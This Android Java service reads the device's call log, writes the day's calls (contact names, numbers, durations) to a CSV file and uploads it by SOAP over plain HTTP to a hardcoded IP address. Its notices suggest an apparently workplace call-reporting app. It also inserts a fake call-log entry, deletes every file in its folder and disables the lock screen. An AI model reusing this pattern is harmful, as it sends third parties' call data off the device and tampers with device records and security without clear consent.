package com.example.tongxunluf;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import org.ksoap2.SoapEnvelope;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.HttpResponseException;
import org.ksoap2.transport.HttpTransportSE;
import org.xmlpull.v1.XmlPullParserException;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;



public class RespenseService extends Service {
    public RespenseService() {
    }
    private String[] FileExist;
    private String[] b2;
    private Uri callUri = CallLog.Calls.CONTENT_URI;
    private String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
            , CallLog.Calls.NUMBER// 通话记录的电话号码
            , CallLog.Calls.DATE// 通话记录的日期
            , CallLog.Calls.DURATION// 通话时长
            , CallLog.Calls.TYPE};// 通话类型}
    private String b;
    private int number1 = 0;
    private int number2 = 0;
    private String phoneNumber;
    private int n1 = 0;
    private int n2 = 0;
    private int fenzhong = 0;
    private int xiaoshi = 0;
    private static final String nameSpace = "http://tempuri.org/";
    private static final String Myurl = "http://49.235.3.119:80/Service.asmx";
    private static final String Mymethod = "SaveFile";
    private static final String Mymethod2 = "IMEI";
    String local_file = Environment.getExternalStorageDirectory().getAbsolutePath() + "/TXT";
    File file2;
    File file;
    private String Name2;
    SimpleDateFormat time = new SimpleDateFormat("yyyy/MM/dd");
    FileOutputStream FO,F1;
    FileReader FR;
    BufferedReader BR;
    int i = 1;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            new Thread() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {
                    Name2 = getNameByIMEI();
                }
            }.start();
        }
        addCallLOg();
        b = time.format((new Date()));
        b = b.replace("/", "-");
        file2 = new File(local_file + "/" + b + ".csv");
        if (file2.exists()) {
            file2.delete();
        }
        file = new File(local_file);
        FileExist = file.list();
        if (FileExist != null) {
            for (int i = 0; i < FileExist.length; i++) {
                File file3 = new File(local_file + "/" + FileExist[i]);
                file3.delete();
            }
        }
        try {
            getContentCallLog();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        String oo = number2 + "";
        if (n2 / 60 != 0) {
            fenzhong = n2 / 60;
            if (fenzhong / 60 != 0) {
                xiaoshi = fenzhong / 60;
                fenzhong = fenzhong - xiaoshi * 60;
                n2 = n2 - fenzhong * 60 - xiaoshi * 60 * 60;
                file2.renameTo(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/TXT" + "/" + b.replace("/", "-") + "  " + Name2 + "  通话数量：" + oo + "  通话时长" + xiaoshi + "h" + fenzhong + "m" + n2 + "s" + ".csv"));
            } else if (fenzhong / 60 == 0) {
                n2 = n2 - fenzhong * 60;
                file2.renameTo(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/TXT" + "/" + b.replace("/", "-") + "  " + Name2 + "  通话数量：" + oo + "  通话时长" + fenzhong + "m" + n2 + "s" + ".csv"));
            }
        } else {
            file2.renameTo(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/TXT" + "/" + b.replace("/", "-") + "  " + Name2 + "  通话数量：" + oo + "  通话时长" + n2 + "s" + ".csv"));
        }
        number2 = 0;
        Timer T = new Timer();
        TimerTask TT = new TimerTask() {
            @Override
            public void run() {
                new Thread() {
                    @Override
                    public void run() {
                        shangchaun();
                    }
                }.start();

            }
        };
        T.schedule(TT,1000);
    }
    public String getNameByIMEI() {

        return "name";
    }

    private void addCallLOg() {  //添加通话记录
        ContentValues values = new ContentValues();
        values.clear();
        values.put(CallLog.Calls.CACHED_NAME, "lum");
        values.put(CallLog.Calls.NUMBER, 123456789);
        values.put(CallLog.Calls.TYPE, "1");
        values.put(CallLog.Calls.NEW, "0");// 0已看1未看 ,由于没有获取默认全为已读
        if (checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        getContentResolver().insert(CallLog.Calls.CONTENT_URI, values);

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void getContentCallLog() throws IOException, NoSuchMethodException {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor cursor = getContentResolver().query(callUri, // 查询通话记录的URI
                columns
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );

        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));  //姓名
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));  //号码
            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)); //获取通话日期
            String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
            String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));
            int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));//获取通话时长，值为多少秒
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)); //获取通话类型：1.呼入2.呼出3.未接
            String dayCurrent = new SimpleDateFormat("dd").format(new Date());
            String dayRecord = new SimpleDateFormat("dd").format(new Date(dateLong));

            String a = new String();
            if (type == 1) {
                a = "呼入";
            } else if (type == 2) {
                a = "呼出";
            }


            if (!file.exists()) {
                file.mkdirs();
            }
            TelephonyManager mT = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            phoneNumber = mT.getLine1Number();
            if (!file2.exists()) {
                file.createNewFile();
                file2.createNewFile();
            }
            b2 = b.split("-");
            n1++;
            if (date.contains(b)) {
                number1 = number1 + 1;
                n1 = number1;
                if (a != "0") {
                    if (duration != 0) {
                        number2 = number2 + 1;
                        String d = "通话日期: " + date + ","//"\n"
                                + "姓名: " + name + ","//"\n"
                                + "电话号码: " + number + ","//"\n"
                                + "通话时长: " + duration + "s" + ","//"\n"
                                + "通话类型: " + a + "\n";
                        FileOutputStream wow = new FileOutputStream(file2, true);
                        wow.write(d.getBytes());
                        wow.close();
                        wow.flush();
                        n2 = n2 + duration;
                    }
                }
            }
            if (number1 != 0) {
                if (n1 != number1) {
                    break;
                }
            }
        }
    }

    private void shangchaun() {
        String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/TXT/";
        File file = new File(path);
        // 获取路径下的所有文件
        String[] names = file.list();
        String filename = names[0];
        File file2 = new File(path + filename);
        FileInputStream in = null;
        byte[] byte1 = new byte[(int) file2.length()];
        try {
            in = new FileInputStream(file2);
            in.read(byte1, 0, (int) file2.length());
            in.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        String a = new String(byte1);
        a = a.replace("\n", "\r\n");
        SoapObject soapObject;
        soapObject = new SoapObject(nameSpace, Mymethod);
        soapObject.addProperty("SB", a);
        soapObject.addProperty("fileName", filename);
        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.bodyOut = soapObject;
        envelope.dotNet = true;
        envelope.setOutputSoapObject(soapObject);
        HttpTransportSE httpTransportSE = new HttpTransportSE(Myurl);
        httpTransportSE.debug = true;
        try {
            httpTransportSE.call(nameSpace + Mymethod, envelope);
            SoapObject object = (SoapObject) envelope.bodyIn;
            file2.delete();
           /* Notifi("通话记录发送成功", "通话记录发送成功，感谢配合");
            Wakeup();*/
            stopSelf();
        } catch (IOException e) {
            e.printStackTrace();
            file2.delete();
            Notifi("请手动发送通话记录", "由于手机网络未开启或者其它未知原因，自动发送失败，若手动发送依旧失败，请邮件联系Tech");
            Wakeup();
            stopSelf();
        } catch (XmlPullParserException e) {
            e.printStackTrace();
            file2.delete();
            Notifi("请手动发送通话记录", "由于手机网络未开启或者其它未知原因，自动发送失败, 若手动发送依旧失败，请邮件联系Tech");
            Wakeup();
            stopSelf();
        }
        //获得服务返回的数据,并且开始解析
        //B2.callOnClick();
        //System.exit(1);
    }

    @SuppressLint("WrongConstant")
    public void Notifi(String title, String text) {
        NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        Notification notification = null;
        Intent resultIntent = new Intent(this, Activity2.class);
        resultIntent.setAction(Intent.ACTION_MAIN);
        resultIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        PendingIntent resultPendingIntent = PendingIntent.getActivity(this, 1, resultIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel mChannel = new NotificationChannel("id", "通知测试", NotificationManager.IMPORTANCE_LOW);
            notificationManager.createNotificationChannel(mChannel);
            notification = new Notification.Builder(this)
                .setChannelId("id")
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                .setDefaults(Notification.DEFAULT_ALL)
                .setContentIntent(resultPendingIntent)
                .setFullScreenIntent(resultPendingIntent, true)
                .setPriority(Notification.PRIORITY_MAX)
                .build();
        } else {
            NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
                .setChannelId("id")
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setOngoing(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setContentIntent(resultPendingIntent)
                .setFullScreenIntent(resultPendingIntent, true)
                .setPriority(Notification.PRIORITY_MAX);
            notification = notificationBuilder.build();
        }
        notificationManager.notify(1, notification);//把通知显示出来
        //startForeground(1,notification);//前台通知(会一直显示在通知栏)
    }

    @SuppressLint("MissingPermission")
    public void Wakeup() {
        KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
        KeyguardManager.KeyguardLock kl = km.newKeyguardLock("unLock");
        //解锁
        kl.disableKeyguard();
        //获取电源管理器对象
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        //获取PowerManager.WakeLock对象,后面的参数|表示同时传入两个值,最后的是LogCat里用的Tag
        @SuppressLint("InvalidWakeLockTag") PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_DIM_WAKE_LOCK, "bright");
        //点亮屏幕
        wl.acquire();
        //释放
        wl.release();
    }
}
